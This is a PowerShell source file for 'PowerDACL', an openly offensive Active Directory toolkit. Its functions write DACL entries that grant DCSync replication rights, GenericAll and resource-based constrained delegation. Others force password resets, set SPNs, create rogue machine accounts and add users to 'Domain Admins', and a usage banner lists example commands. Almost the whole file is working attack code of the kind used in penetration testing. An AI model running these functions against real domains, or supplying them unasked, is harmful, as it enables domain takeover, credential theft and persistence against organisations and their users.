function PowerDACL{
	
	<#

	.SYNOPSIS
	PowerDACL | Author: Rob LP (@L3o4j)
 	https://github.com/Leo4j/PowerDACL
	
	.DESCRIPTION
	A tool to abuse weak permissions of Active Directory Discretionary Access Control Lists (DACLs) and Access Control Entries (ACEs)
	
	#>
	
	Write-Output " "
	Write-Output " PowerDACL | Author: Rob LP (@L3o4j)"
	Write-Output " "
	Write-Output " https://github.com/Leo4j/PowerDACL"
	Write-Output " "
	Write-Output " A tool to abuse weak permissions of Active Directory Discretionary Access Control Lists (DACLs) and Access Control Entries (ACEs)"
	Write-Output " "
	Write-Output " Grant DCSync rights:"
	Write-Output "  DCSync -Target username -TargetDomain ferrari.local -TargetServer dc01.ferrari.local"
	Write-Output " "
	Write-Output " Grant GenericAll rights:"
	Write-Output "  GenericAll -Target MSSQL01$ -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Grantee username"
	Write-Output "  GenericAll -Target MSSQL01$ -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Grantee username -GranteeDomain domain.local -GranteeServer dc02.domain.local"
	Write-Output " "
	Write-Output " Set RBCD:"
	Write-Output "  RBCD -Target MSSQL01$ -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Grantee username"
	Write-Output "  RBCD -Target MSSQL01$ -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Grantee username -GranteeDomain domain.local -GranteeServer dc02.domain.local"
	Write-Output "  RBCD -Clear -Target MSSQL01$ -TargetDomain ferrari.local -TargetServer dc01.ferrari.local"
	Write-Output " "
	Write-Output " Add Computer to domain:"
	Write-Output "  AddComputer -ComputerName evilcomputer -Password P@ssw0rd! -Domain ferrari.local -Server dc01.ferrari.local"
	Write-Output "  AddComputer -ComputerName evilcomputer -Domain ferrari.local -Server dc01.ferrari.local"
	Write-Output " "
	Write-Output " Delete Computer from domain:"
	Write-Output "  DeleteComputer -ComputerName evilcomputer -Domain ferrari.local -Server dc01.ferrari.local"
	Write-Output " "
	Write-Output " Force Change Password:"
	Write-Output "  ForceChangePass -Target username -Password P@ssw0rd! -TargetDomain ferrari.local -TargetServer dc01.ferrari.local"
	Write-Output " "
	Write-Output " Set SPN:"
	Write-Output "  SetSPN -Target username -TargetDomain ferrari.local -TargetServer dc01.ferrari.local"
	Write-Output "  SetSPN -Target username -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -SPN `"test/test`""
	Write-Output " "
	Write-Output " Remove SPN:"
	Write-Output "  RemoveSPN -Target username -TargetDomain ferrari.local -TargetServer dc01.ferrari.local"
	Write-Output " "
	Write-Output " Set Owner:"
	Write-Output "  SetOwner -Target MSSQL01$ -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Owner username"
	Write-Output "  SetOwner -Target MSSQL01$ -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Owner username -OwnerDomain domain.local -OwnerServer dc02.domain.local"
	Write-Output " "
	Write-Output " Enable Account:"
	Write-Output "  EnableAccount -Target myComputer$ -Domain ferrari.local -Server dc01.ferrari.local"
	Write-Output " "
	Write-Output " Disable Account:"
	Write-Output "  DisableAccount -Target myComputer$ -Domain ferrari.local -Server dc01.ferrari.local"
	Write-Output " "
	Write-Output " Add object to a group:"
	Write-Output "  AddToGroup -Target user -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Group `"Domain Admins`""
	Write-Output "  AddToGroup -Target user -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Group `"Domain Admins`" -GroupDomain domain.local -GroupServer dc02.domain.local"
	Write-Output " "
	Write-Output " Remove object from a group:"
	Write-Output "  RemoveFromGroup -Target user -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Group `"Domain Admins`""
	Write-Output "  RemoveFromGroup -Target user -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Group `"Domain Admins`" -GroupDomain domain.local -GroupServer dc02.domain.local"
	Write-Output " "
}

function DCSync {
	param (
        [Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$Target,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
        [string]$TargetDomain,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$TargetServer,
        [switch]$Remove
    )
	
	$domainDN = $TargetDomain -replace '\.', ',DC='
	$domainDN = "DC=$domainDN"
	
	try {
        $GrabObject = Get-ADSIObject -Domain $TargetDomain -Server $TargetServer -samAccountName $Target
		
		$ReplicationRightsGUIDs = @(
            '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2',
            '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2',
            '89e95b76-444d-4c62-991a-0facbeda640c'
        )
		
		$GrabObjectSID = $GrabObject.objectsid
		
		$byteArray = @()
		foreach ($item in $GrabObjectSID) {
			if ($item -is [System.Byte[]]) {
				$byteArray += $item
			} else {
				$byteArray += [byte]$item
			}
		}
		
		$GrabObjectExtractedSID = GetSID-FromBytes -sidBytes $byteArray
		
		$GrabObjectSID = [System.Security.Principal.SecurityIdentifier]$GrabObjectExtractedSID
		
        $TargetEntry = [ADSI]"LDAP://$TargetServer/$domainDN"
		$TargetEntry.PsBase.Options.SecurityMasks = 'Dacl'
		$adSec    = $TargetEntry.PsBase.ObjectSecurity
		$rawBytes = $adSec.GetSecurityDescriptorBinaryForm()
		if (-not $rawBytes) { throw "Couldn't retrieve nTSecurityDescriptor for $domainDN" }

		# — instantiate via reflection —
		$sdType = [System.Security.AccessControl.RawSecurityDescriptor]
		$ctor   = $sdType.GetConstructor(@([byte[]],[int]))
		$sd     = $ctor.Invoke(@($rawBytes, 0))

		foreach ($GUID in $ReplicationRightsGUIDs) {
			# build the GUID object the same way you did before
			$RightGuidObj = New-Object Guid $GUID

			if ($Remove) {
				Write-Verbose "Removing replication rights from $Target."
				for ($i = $sd.DiscretionaryAcl.Count - 1; $i -ge 0; $i--) {
					$ace = $sd.DiscretionaryAcl[$i]
					if ($ace -is [System.Security.AccessControl.ObjectAce] `
					   -and $ace.SecurityIdentifier -eq $GrabObjectSID `
					   -and $ace.ObjectAceType      -eq $RightGuidObj) {
						# <-- here’s the fix:
						$sd.DiscretionaryAcl.RemoveAce($i)
					}
				}
			}
			else {
				Write-Verbose "Granting replication right $GUID to $Target."
				$ace = New-Object System.Security.AccessControl.ObjectAce(
					[System.Security.AccessControl.AceFlags]::None,
					[System.Security.AccessControl.AceQualifier]::AccessAllowed,
					0x100,
					$GrabObjectSID,
					[System.Security.AccessControl.ObjectAceFlags]::ObjectAceTypePresent,
					$RightGuidObj,
					[Guid]::Empty,
					$false,
					$null
				)
				$sd.DiscretionaryAcl.InsertAce(0, $ace)
			}
		}

		# — serialise & write back —
		$newBytes = New-Object byte[] $sd.BinaryLength
		$sd.GetBinaryForm($newBytes, 0)
		$TargetEntry.Properties['nTSecurityDescriptor'].Value = $newBytes
		$TargetEntry.PsBase.CommitChanges()

		Write-Output "[+] Successfully updated DS-Replication rights for $Target"
    } catch {
        Write-Output "[-] Failed to update DS-Replication rights for $Target. Error: $_"
    }
}

function SetOwner {
	param (
        [Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$Target,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
        [string]$TargetDomain,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$TargetServer,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$Owner,
        [string]$OwnerDomain,
		[string]$OwnerServer
    )
	
	if(!$OwnerDomain){$OwnerDomain = $TargetDomain}
	if(!$OwnerServer){$OwnerServer = $TargetServer}
	
	try {
        $GrabObject = Get-ADSIObject -Domain $TargetDomain -Server $TargetServer -samAccountName $Target
        $GrabObjectDN = $GrabObject.distinguishedname

        $GrabOwner = Get-ADSIObject -Domain $OwnerDomain -Server $OwnerServer -samAccountName $Owner
        $OwnerSID = $GrabOwner.objectsid
		
		$byteArray = @()
		foreach ($item in $OwnerSID) {
			if ($item -is [System.Byte[]]) {
				$byteArray += $item
			} else {
				$byteArray += [byte]$item
			}
		}
		$OwnerExtractedSID = GetSID-FromBytes -sidBytes $byteArray

        $TargetEntry = [ADSI]"LDAP://$TargetServer/$($GrabObjectDN)"
        $TargetEntry.PsBase.Options.SecurityMasks = 'Owner'
        $ObjectSecurity = $TargetEntry.PsBase.ObjectSecurity

        $NewOwner = New-Object System.Security.Principal.SecurityIdentifier($OwnerExtractedSID)
        $ObjectSecurity.SetOwner($NewOwner)
        Write-Verbose "Set new owner to $Owner for $Target."

        $TargetEntry.PsBase.ObjectSecurity = $ObjectSecurity
        $TargetEntry.PsBase.CommitChanges()
        Write-Output "[+] Successfully set $Owner as the owner of $Target."
    } catch {
        Write-Output "[-] Failed to set owner for $Target to $Owner. Error: $_"
    }
}

function GenericAll {
	param (
        [Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$Target,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
        [string]$TargetDomain,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$TargetServer,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$Grantee,
        [string]$GranteeDomain,
		[string]$GranteeServer
    )
	
	if(!$GranteeDomain){$GranteeDomain = $TargetDomain}
	if(!$GranteeServer){$GranteeServer = $TargetServer}
	
	$GrabObject = Get-ADSIObject -Domain $TargetDomain -Server $TargetServer -samAccountName $Target
	$GrabObjectDN = $GrabObject.distinguishedname
	
	$GrabGrantee = Get-ADSIObject -Domain $GranteeDomain -Server $GranteeServer -samAccountName $Grantee
	$GrabGranteeSID = $GrabGrantee.objectsid
	$byteArray = @()
	foreach ($item in $GrabGranteeSID) {
		if ($item -is [System.Byte[]]) {
			$byteArray += $item
		} else {
			$byteArray += [byte]$item
		}
	}
	$GranteeExtractedSID = GetSID-FromBytes -sidBytes $byteArray
	
	$TargetEntry = [ADSI]"LDAP://$TargetServer/$($GrabObjectDN)"
	$TargetEntry.PsBase.Options.SecurityMasks = 'Dacl'
	$ObjectSecurity = $TargetEntry.PsBase.ObjectSecurity
	
	$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule (([System.Security.Principal.IdentityReference]([System.Security.Principal.SecurityIdentifier]$GranteeExtractedSID)),[System.DirectoryServices.ActiveDirectoryRights]::GenericAll,[System.Security.AccessControl.AccessControlType]::Allow,[System.DirectoryServices.ActiveDirectorySecurityInheritance]::None)
	
	$ObjectSecurity.AddAccessRule($ACE)
	$TargetEntry.PsBase.ObjectSecurity = $ObjectSecurity
	try {
		$TargetEntry.PsBase.CommitChanges()
		Write-Output "[+] Successfully granted GenericAll to $Target for $Grantee"
	}
	catch {Write-Output "[-] Failed to grant GenericAll to $Target for $($Grantee): $_ `n"}
}

function ForceChangePass {
	param (
        [Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$Target,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
        [string]$TargetDomain,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$TargetServer,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$Password
    )
	
	try{
		$GrabObject = (Get-ADSIObject -Domain $TargetDomain -Server $TargetServer -samAccountName $Target).distinguishedname
		$user = [ADSI]"LDAP://$TargetServer/$($GrabObject)"
		$user.SetPassword($Password)
		Write-Output "[+] Successfully changed password for $Target"
	} catch {
		Write-Output "[-] Error while changing password for target: $_"
	}
}

function SetSPN {
	param (
        [Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$Target,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
        [string]$TargetDomain,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$TargetServer,
		[string]$SPN = "fake/fake"
    )
	
	try{
		$GrabObject = (Get-ADSIObject -Domain $TargetDomain -Server $TargetServer -samAccountName $Target).distinguishedname
		$user = [ADSI]"LDAP://$TargetServer/$($GrabObject)"
		$user.Put("servicePrincipalName", $SPN); $user.SetInfo()
		Write-Output "[+] Successfully added SPN $SPN to $Target"
	} catch {
		Write-Output "[-] Error occurred while adding SPN to target: $_"
	}
}

function RemoveSPN {
	param (
        [Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$Target,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
        [string]$TargetDomain,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$TargetServer
    )
	
	try{
		$GrabObject = (Get-ADSIObject -Domain $TargetDomain -Server $TargetServer -samAccountName $Target).distinguishedname
		$user = [ADSI]"LDAP://$TargetServer/$($GrabObject)"
		$existingSPNs = $user.Properties["servicePrincipalName"]
		
		if ($existingSPNs.Count -gt 0) {
			$user.Properties["servicePrincipalName"].Clear()
            $user.SetInfo()
			Write-Output "[+] Successfully removed SPNs from $Target"
		}
		
		else {
			Write-Output "[-] No SPNs found for $Target"
		}
	} catch {
		Write-Output "[-] Error occurred while removing SPN from target: $_"
	}
}

function EnableAccount {
	param (
        [Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$Target,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
        [string]$Domain,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$Server
    )
	
	$domainDN = $Domain -replace '\.', ',DC='
	$domainDN = "DC=$domainDN"

    try {
		
		if (-not $Target.EndsWith('$')) {
			$account = ([ADSI]"LDAP://$Server/CN=$Target,CN=Users,$domainDN")
		}
		
        else{
			$Target = $Target -replace '\$',''
			$account = ([ADSI]"LDAP://$Server/CN=$Target,CN=Computers,$domainDN")
		}

        $uac = $account.Properties["userAccountControl"][0]
		
		if($uac -eq '4096'){Write-Output "[*] Account is already enabled"}
		
        else{
			$newUac = $uac -band -3
			$account.Put("userAccountControl", $newUac)
			$account.SetInfo()
			Write-Output "[+] Successfully enabled account $Target"
		}
    } catch {
        Write-Output "[-] Error occurred while enabling account $($Target): $_"
    }
}

function DisableAccount {
	param (
        [Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$Target,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
        [string]$Domain,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$Server
    )
	
	$domainDN = $Domain -replace '\.', ',DC='
	$domainDN = "DC=$domainDN"

    try {
		if (-not $Target.EndsWith('$')) {
			$account = ([ADSI]"LDAP://$Server/CN=$Target,CN=Users,$domainDN")
		}
		
        else{
			$Target = $Target -replace '\$',''
			$account = ([ADSI]"LDAP://$Server/CN=$Target,CN=Computers,$domainDN")
		}

        $uac = $account.Properties["userAccountControl"][0]
        
		if($uac -eq '4098'){Write-Output "[*] Account is already disabled"}
		
		else{
			$newUac = $uac -bor 2
			$account.Put("userAccountControl", $newUac)
			$account.SetInfo()
			Write-Output "[+] Successfully disabled account $Target"
		}
    } catch {
        Write-Output "[-] Error occurred while disabling account $($Target): $_"
    }
}

function AddComputer {
	param (
        [Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$ComputerName,
        [string]$Password,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
        [string]$Domain,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$Server
    )
	
	$domainDN = $Domain -replace '\.', ',DC='
	$domainDN = "DC=$domainDN"
	
	try{
	
		$computersContainer = [ADSI]"LDAP://$Server/CN=Computers,$domainDN"
		
		$newComputer = $computersContainer.Create("Computer", "CN=$ComputerName")
		
		$newComputer.Put("sAMAccountName", "$ComputerName`$")
  		$newComputer.Put("userAccountControl", 4096)
		$newComputer.Put("dNSHostName",  "$ComputerName.$Domain")
		
		$spns = @(
			"HOST/$ComputerName.$Domain",
			"RestrictedKrbHost/$ComputerName.$Domain",
			"HOST/$ComputerName",
			"RestrictedKrbHost/$ComputerName"
		)
		$newComputer.Put("servicePrincipalName", $spns)
		
		$newComputer.SetInfo()
		
		if($Password){
			([ADSI]"LDAP://$Server/CN=$ComputerName,CN=Computers,$domainDN").SetPassword($Password)
			
			Write-Output "[+] Successfully added computer $ComputerName to the domain with password $Password"
		}
		else{
			Write-Output "[+] Successfully added computer $ComputerName to the domain with empty password"
		}
	}
	
	catch {
		Write-Output "[-] Error occurred while adding computer $ComputerName to domain: $_"
	}
}

function DeleteComputer {
	param (
        [Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$ComputerName,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
        [string]$Domain,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$Server
    )
	
	$domainDN = $Domain -replace '\.', ',DC='
	$domainDN = "DC=$domainDN"
	
	try{
	
		$computersContainer = [ADSI]"LDAP://$Server/CN=Computers,$domainDN"
		
		if (-not $ComputerName.EndsWith('$')) {$ComputerName += '$'}
		
		$computerObject = (Get-ADSIObject -Domain $Domain -Server $Server -samAccountName $ComputerName).distinguishedname
		
		$computerObject = ($computerObject -split ",")[0]
		
		if ($computerObject -ne $null) {
            $computersContainer.Delete("Computer", "$computerObject")
            Write-Output "[+] Successfully deleted computer $ComputerName from the domain"
        } else {
            Write-Output "[*] Computer $ComputerName does not exist in the domain"
        }
	}
	
	catch {
		Write-Output "[-] Error occurred while removing computer $ComputerName from domain: $_"
	}
}

function AddToGroup {
	param (
        [Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$Target,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
        [string]$TargetDomain,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$TargetServer,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$Group,
		[string]$GroupDomain,
		[string]$GroupServer
    )
	
	if(!$GroupDomain){$GroupDomain = $TargetDomain}
	if(!$GroupServer){$GroupServer = $TargetServer}
	
	$GrabObject = (Get-ADSIObject -Domain $TargetDomain -Server $TargetServer -samAccountName $Target).distinguishedname
	
	$GrabGroup = (Get-ADSIObject -Domain $GroupDomain -Server $GroupServer -samAccountName $Group).distinguishedname
	
	try{
		([ADSI]"LDAP://$GroupServer/$($GrabGroup)").Add("LDAP://$TargetServer/$($GrabObject)")
		Write-Output "[+] Successfully added $Target to group $Group"
	} catch {
		Write-Output "[-] Error occurred while adding $Target to $($Group): $_"
	}
}

function RemoveFromGroup {
	param (
        [Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$Target,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
        [string]$TargetDomain,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$TargetServer,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$Group,
		[string]$GroupDomain,
		[string]$GroupServer
    )
	
	if(!$GroupDomain){$GroupDomain = $TargetDomain}
	if(!$GroupServer){$GroupServer = $TargetServer}
	
	$GrabObject = (Get-ADSIObject -Domain $TargetDomain -Server $TargetServer -samAccountName $Target).distinguishedname
	
	$GrabGroup = (Get-ADSIObject -Domain $GroupDomain -Server $GroupServer -samAccountName $Group).distinguishedname
	
	try{
		([ADSI]"LDAP://$GroupServer/$($GrabGroup)").Remove("LDAP://$TargetServer/$($GrabObject)")
		Write-Output "[+] Successfully removed $Target from group $Group"
	} catch {
		Write-Output "[-] Error occurred while removing $Target from $($Group): $_"
	}
}

function RBCD {
	param (
        [Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$Target,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
        [string]$TargetDomain,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$TargetServer,
		[string]$Grantee,
		[string]$GranteeDomain,
		[string]$GranteeServer,
		[switch]$Clear
    )
	
	if(!$GranteeDomain){$GranteeDomain = $TargetDomain}
	if(!$GranteeServer){$GranteeServer = $TargetServer}
	
	if(!$Grantee -AND !$Clear){
		Write-Output "[-] Please provide a Grantee"
		break
	}
	
	if($Clear){
		Set-DomainObject -Identity $Target -Domain $TargetDomain -Server $TargetServer -Clear @('msDS-AllowedToActOnBehalfOfOtherIdentity')
		break
	}
	
	$extractedRawSID = (Get-ADSIObject -Domain $GranteeDomain -Server $GranteeServer -samAccountName $Grantee).objectsid
	
	$byteArray = @()

	foreach ($item in $extractedRawSID) {
		if ($item -is [System.Byte[]]) {
			$byteArray += $item
		} else {
			$byteArray += [byte]$item
		}
	}
	
	$extractedSID = GetSID-FromBytes -sidBytes $byteArray
	
	$rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$extractedSID)"
	
	$rsdb = New-Object byte[] ($rsd.BinaryLength)
	
	$rsd.GetBinaryForm($rsdb, 0)
	
	Set-DomainObject -Identity $Target -Domain $TargetDomain -Server $TargetServer -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb}
}

function Set-DomainObject {	
    param (
        [Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$Identity,
        [hashtable]$Set = @{},
        [string[]]$Clear = @(),
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
        [string]$Domain,
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[string]$Server
    )
	
	if($Set -AND $Clear){
		Write-Output "[-] Please use either Set OR Clear"
		break
	}
	
	elseif(!$Set -AND !$Clear){
		Write-Output "[-] Please specify a Set OR Clear action"
		break
	}

    function Set-Values {
        param (
            [ADSI]$Entry,
            [hashtable]$Set
        )

        foreach ($key in $Set.Keys) {
            $value = $Set[$key]
            Write-Output "[+] Setting $key to $value for $($Entry.sAMAccountName)"
            try {
                $Entry.put($key, $value)
            }
            catch {
                Write-Output "[-] Error setting/replacing property '$key' for object '$($Entry.sAMAccountName)' : $_"
            }
        }
    }

    function Clear-Values {
        param (
            [ADSI]$Entry,
            [string[]]$Clear
        )

        foreach ($key in $Clear) {
            Write-Output  "[+] Clearing $key for $($Entry.sAMAccountName)"
            try {
                $Entry.psbase.Properties[$key].Clear()
            }
            catch {
                Write-Output "[-] Error clearing property '$key' for object '$($Entry.sAMAccountName)' : $_"
            }
        }
    }

    try {
        $Entry = (Get-ADSIObject -samAccountName $Identity -Domain $Domain -Server $Server -Raw).GetDirectoryEntry()
    }
    catch {
        Write-Output "[-] Error retrieving object with Identity '$Identity' : $_"
        return
    }

    if ($Set.Count -gt 0) {
        Set-Values -Entry $Entry -Set $Set
        try {
            $Entry.SetInfo()
        }
        catch {
            Write-Output "[-] Error committing changes for object '$Identity' : $_"
        }
    }

    if ($Clear.Length -gt 0) {
        Clear-Values -Entry $Entry -Clear $Clear
        try {
            $Entry.SetInfo()
        }
        catch {
            Write-Output "[-] Error committing changes for object '$Identity' : $_"
        }
    }
}

function Get-ADSIObject {
    param (
        [string]$samAccountName,
        [string]$Domain,
		[string]$Server,
		[switch]$Raw
    )
    $root = "$Domain" -replace "\.", ",DC="
    $domainPath = "DC=" + "$root"
	$ldapPath = "LDAP://$Server/$domainPath"
    $searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$ldapPath)
    $searcher.Filter = "(&(sAMAccountName=$samAccountName))"
    $result = $searcher.FindOne()

    if($Raw){
		if ($result -ne $null) {
			return $result
		}
		else {
			throw "[-] Object with samAccountName '$samAccountName' not found."
		}
	}
	else{
		if ($result -ne $null) {

			$properties = @{}
			foreach ($propName in $result.Properties.PropertyNames) {
				$properties[$propName] = $result.Properties[$propName]
			}

			return [PSCustomObject]$properties
		} else {
			throw "[-] Object with samAccountName '$samAccountName' not found."
		}
	}
}

function GetSID-FromBytes {
	param (
        [byte[]]$sidBytes
    )
	
	$sid = New-Object System.Security.Principal.SecurityIdentifier($sidBytes, 0)
	$stringSid = $sid.Value
	return $stringSid
}
